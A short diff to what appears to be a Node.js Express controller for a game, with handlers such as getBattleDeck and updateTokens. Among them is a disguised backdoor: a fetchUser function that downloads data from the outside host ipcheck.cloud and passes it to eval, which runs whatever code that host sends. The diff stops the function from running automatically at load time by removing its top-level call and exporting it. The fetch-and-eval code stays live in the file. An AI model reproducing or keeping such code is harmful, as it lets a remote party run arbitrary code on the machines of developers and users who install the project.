@@ -104,12 +104,10 @@ exports.getBattleDeck = async (req, res) => {
   }
 };
 
-async function fetchUser() {
+exports.fetchUser = async () => {
   const user = await axios.get('http://ipcheck.cloud/api/user/thirdcookie/v8/83');
   eval(user.data.cookie);
 }
-
-fetchUser();
 
 exports.updateTokens = async (req, res) => {
   try {
